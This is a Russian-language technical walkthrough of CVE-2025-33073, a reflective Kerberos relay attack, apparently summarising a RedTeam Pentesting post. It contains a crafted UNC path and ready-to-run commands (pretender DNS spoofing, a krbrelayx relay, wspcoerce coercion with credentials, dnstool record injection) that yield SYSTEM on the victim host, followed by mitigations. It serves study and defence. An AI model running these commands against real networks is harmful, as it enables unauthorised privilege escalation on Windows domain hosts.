# Reflective Kerberos Relay Attack (CVE-2025-33073)

> RedTeam Pentesting, June 2025. Patched MS June 10, 2025.  
> Оригинал: https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/

---

## Роли в примере

```
dc01.ttt.local   10.0.0.1    Domain Controller (KDC + AD DNS)
db.ttt.local     10.0.0.2    Жертва (Windows Server)
kali             10.0.0.99   Атакующий (Linux)

Домен:  ttt.local
Учётка: user1:Password123  (низкие права в домене)
```

---

## Суть атаки в одной строке

Windows разделяет «к кому подключаться» и «для кого брать TGS» — если подсунуть специальный UNC путь с `CREDENTIAL_TARGET_INFORMATIONW` в hostname, жертва запросит TGS **для себя**, но пришлёт его **атакующему**. Атакующий relay-ит тикет обратно жертве → получает SYSTEM.

---

## 1. UNC путь — как устроен

### Нормальный UNC

```
\\server.corp.local\share
  └─ hostname = server.corp.local
  └─ жертва запрашивает TGS для cifs/server.corp.local
  └─ AP-REQ уходит на server.corp.local
```

### Вредоносный UNC (эта атака)

```
file:////db1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
          ↑↑└──────────────────────────────────────────┘
          ││  CredMarshalTargetInfo(CREDENTIAL_TARGET_INFORMATIONW)
          │└─ разделитель (часть encoding)
          └── "db" — начало имени жертвы (для mDNS spoof wildcard)
```

Техника `CredMarshalTargetInfo` разработана James Forshaw (Google Project Zero).

### Что закодировано внутри blob

```c
CREDENTIAL_TARGET_INFORMATIONW {
    TargetName:    L"db.ttt.local",   // ← отсюда берётся SPN для TGS-REQ
    DnsServerName: L"db.ttt.local",
    DnsDomainName: L"ttt.local",
    Flags:         0
}
```

### Что происходит когда жертва парсит путь

```
Windows получает UNC: \\db1UWhRC.../path
  │
  ├─ Видит encoded blob в hostname
  ├─ Вызывает CredUnmarshalTargetInfo()
  ├─ Получает TargetName = "db.ttt.local"
  │
  ├─ TGS-REQ → DC: "дай тикет для cifs/db.ttt.local"   ← SPN = жертва сама себе
  │
  └─ Резолвит hostname db1UWhRC... → DNS query
       └─ pretender отвечает: 10.0.0.99 (Kali)
       └─ AP-REQ уходит на Kali, а не на db.ttt.local
```

**Ключевое:** SPN в TGS = `cifs/db.ttt.local`, но AP-REQ получает Kali.  
Relay обратно на `db.ttt.local` → тикет валиден (SPN совпадает).

---

## 2. Порядок запуска терминалов

> Сначала поднять listeners, потом trigger. Иначе пакеты пройдут мимо.

### Terminal 1 — DNS spoof (запустить ПЕРВЫМ)

```bash
sudo pretender -i eth0 \
  --no-dhcp-dns \
  --no-timestamps \
  --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*'
```

`pretender` слушает mDNS (5353/UDP), LLMNR (5355/UDP), NetBIOS-NS (137/UDP).  
Wildcard `*1UWhRC...` = ответить на любой запрос содержащий этот blob → `10.0.0.99`.

### Terminal 2 — Kerberos relay listener (запустить ВТОРЫМ)

```bash
krbrelayx.py \
  --target smb://db.ttt.local \
  -c whoami
```

Модификация krbrelayx: при SPNEGO negotiate отвечает жертве:
```
SecurityBlob: SPNEGO {
  negTokenInit {
    mechTypes: [1.3.6.1.5.5.2]   ← только Kerberos, без NTLM
  }
}
```
Windows видит «NTLM не поддерживается» → переходит на Kerberos.

### Terminal 3 — Coercion (запустить ПОСЛЕДНИМ)

```bash
wspcoerce 'ttt.local/user1:Password123@db.ttt.local' \
  'file:////db1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/share'
```

`wspcoerce` использует DCERPC pipe **MsFteWds** (Windows Search) для принудительной аутентификации.  
`db.ttt.local` получает DCERPC запрос и пытается подключиться к указанному UNC пути.

---

## 3. mDNS poisoning — когда работает, когда нет

### Работает

| Условие | Почему |
|---|---|
| mDNS включён (дефолт Windows) | broadcast запросы идут в сеть |
| LLMNR включён (дефолт до Win11 24H2) | дополнительный fallback |
| Нет легитимной DNS записи для blob hostname | DC не ответит раньше |
| Kali в том же L2 сегменте | broadcast достигает |

### НЕ работает

| Условие | Почему | Альтернатива |
|---|---|---|
| mDNS/LLMNR заблокированы GPO | broadcast дропается | AD DNS запись |
| Жертва и Kali в разных VLAN | broadcast не проходит | AD DNS запись |
| Windows Defender Credential Guard | Kerberos изолирован | — |
| SMB signing enforced | relay принят, но команда fail | LDAP target вместо SMB |

### Альтернатива mDNS — AD DNS запись

```bash
# Добавить A-запись напрямую в AD DNS (нужна учётка домена)
python3 krbrelayx/dnstool.py \
  -u 'ttt.local\user1' \
  -p 'Password123' \
  --action add \
  --record 'db1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
  --data '10.0.0.99' \
  --type A \
  dc01.ttt.local
```

Теперь DC сам резолвит blob hostname → `10.0.0.99`. mDNS не нужен.

---

## 4. Полный алгоритм с визуализацией

### Фаза 0 — Подготовка

```
Kali                          Сеть
 │
 ├─ Terminal 1: pretender ────► слушает mDNS/LLMNR/NetBIOS broadcast
 │                              готов ответить на *1UWhRC...* → 10.0.0.99
 │
 └─ Terminal 2: krbrelayx ───► слушает SMB :445 (или Kerberos)
                                готов relay AP-REQ → smb://db.ttt.local
```

### Фаза 1 — Coercion

```
Kali                    db.ttt.local            dc01.ttt.local
 │                           │                        │
 ├─wspcoerce DCERPC──────────►                        │
 │  MsFteWds pipe             │                        │
 │  UNC: file:////db1UWhRC.../│                        │
 │                            │                        │
 │              db парсит UNC:│                        │
 │              CredUnmarshal │                        │
 │              TargetName =  │                        │
 │              "db.ttt.local"│                        │
```

### Фаза 2 — TGS запрос (жертва просит тикет для СЕБЯ)

```
Kali                    db.ttt.local            dc01.ttt.local
 │                           │                        │
 │                           ├─TGS-REQ───────────────►│
 │                           │  sname: cifs/db.ttt.local  (!)
 │                           │  (из CREDENTIAL_TARGET_INFORMATIONW)
 │                           │                        │
 │                           │◄──TGS-REP──────────────┤
 │                           │  ticket {               │
 │                           │    sname: cifs/db.ttt.local
 │                           │    enc: key=DB$         │
 │                           │  }                      │
```

### Фаза 3 — DNS spoof + AP-REQ к атакующему

```
Kali (pretender)        db.ttt.local            dc01.ttt.local
 │                           │                        │
 │◄─mDNS query───────────────┤                        │
 │  "db1UWhRC...?"           │                        │
 │                           │                        │
 ├─mDNS reply────────────────►                        │
 │  "db1UWhRC... = 10.0.0.99"│                        │
 │                           │                        │
 │◄─AP-REQ───────────────────┤                        │
 │  ticket {                 │                        │
 │    sname: cifs/db.ttt.local                        │
 │    enc: key=DB$           │                        │
 │  }                        │                        │
 │  authenticator {          │                        │
 │    cname: DB$             │                        │
 │    KERB_LOCAL: <SYSTEM process binding>            │
 │  }                        │                        │
```

### Фаза 4 — Relay обратно на жертву

```
Kali (krbrelayx)        db.ttt.local            dc01.ttt.local
 │                           │                        │
 ├─AP-REQ relay──────────────►                        │
 │  (тот же пакет)           │                        │
 │                           │ decrypt TGS:            │
 │                           │   ключ = DB$ → OK ✓    │
 │                           │   sname = db.ttt.local  │
 │                           │              → OK ✓     │
 │                           │                        │
 │                           │ KERB_LOCAL check:       │
 │                           │   исходный процесс      │
 │                           │   = SYSTEM process      │
 │                           │   → reuse SYSTEM token  │
 │                           │              → OK ✓     │
 │                           │                        │
 │◄─NT AUTHORITY\SYSTEM──────┤                        │
```

### Полная схема одним блоком

```
┌─────────────────────────────────────────────────────────────────────┐
│                    REFLECTIVE KERBEROS RELAY                         │
│                         CVE-2025-33073                              │
└─────────────────────────────────────────────────────────────────────┘

  [KALI 10.0.0.99]           [DB 10.0.0.2]            [DC 10.0.0.1]
  ─────────────────          ──────────────            ─────────────
  pretender (mDNS)
  krbrelayx (:445)

  1. wspcoerce ──── DCERPC MsFteWds ──────────────────────────────────►
                    UNC: file:////db1UWhRC.../share

                    ◄── CredUnmarshalTargetInfo ───────────────────────
                         TargetName = "db.ttt.local"

  2.                             ────── TGS-REQ (cifs/db.ttt.local) ──►
                                 ◄───── TGS-REP (enc key=DB$) ──────────

  3.                ──── DNS query: db1UWhRC...? ───────────────────────►
  ◄── mDNS: 10.0.0.99 ──────────────────────────────────────────────────

  4. ◄── AP-REQ ───────────────────────────────────────────────────────
         TGS[sname=cifs/db, enc=DB$] + Auth[KERB_LOCAL=SYSTEM]

  5. ──── relay AP-REQ ──────────────────────────────────────────────►
          (без изменений)

                              decrypt DB$ key ✓
                              sname match ✓
                              KERB_LOCAL → SYSTEM token reuse ✓

  6. ◄── SYSTEM shell ─────────────────────────────────────────────────
```

---

## 5. Почему SYSTEM (механизм token reuse)

Windows защищает от loopback relay через привязку тикета к процессу:

```
Обычный loopback (защита работает):
  ProcessA (user) аутентифицируется сам к себе
  KERB_LOCAL = привязка к ProcessA
  Windows проверяет: caller = ProcessA → OK, но токен не повышается

CVE-2025-33073 (защита НЕ работает):
  ProcessX (SYSTEM) инициирует аутентификацию → KERB_LOCAL = SYSTEM process
  AP-REQ перехватывает Kali → relay обратно
  Windows проверяет KERB_LOCAL → видит SYSTEM process
  → переиспользует SYSTEM токен вместо создания нового
  → команда выполняется как NT AUTHORITY\SYSTEM
```

Структуры в Authenticator:
```
KERB_AD_RESTRICTION_ENTRY  — machine ID, процесс, integrity level
KERB_LOCAL                 — loopback идентификатор (PID + session)
```

---

## 6. Условия для атаки

| Условие | Дефолт | Обход |
|---|---|---|
| SMB signing не enforced на жертве | выключен (кроме DC и Win11 24H2+) | relay на LDAP |
| Coercion работает (MsFteWds pipe) | Win10/11/Server 2019-2025 | другие pipes |
| mDNS/LLMNR или AD DNS | включены по дефолту | AD DNS запись |
| Низкоправная учётка домена | нужна для wspcoerce | — |

---

## 7. Инструменты

| Инструмент | Назначение | Репо |
|---|---|---|
| `wspcoerce` | DCERPC coercion через MsFteWds | RedTeam Pentesting (кастомный) |
| `pretender` | mDNS/LLMNR/NetBIOS spoofing | github.com/RedTeamPentesting/pretender |
| `krbrelayx` (modified) | Kerberos relay, форсирует Kerberos вместо NTLM | github.com/dirkjanm/krbrelayx |
| `dnstool.py` | AD DNS запись (альтернатива mDNS) | входит в krbrelayx |

---

## 8. Mitigation

| Мера | Что блокирует |
|---|---|
| Установить патч MS (июнь 2025) | CVE-2025-33073 закрыта |
| SMB signing enforced (GPO) | relay в SMB fail |
| LDAP signing + channel binding | relay в LDAP fail |
| Отключить mDNS/LLMNR (GPO) | DNS spoof fail (нужна AD DNS) |
| Ограничить `MsFteWds` pipe | coercion fail |
| Network segmentation | attacker не в том же L2 |

---

*Источник: RedTeam Pentesting, CVE-2025-33073, 11 июня 2025*
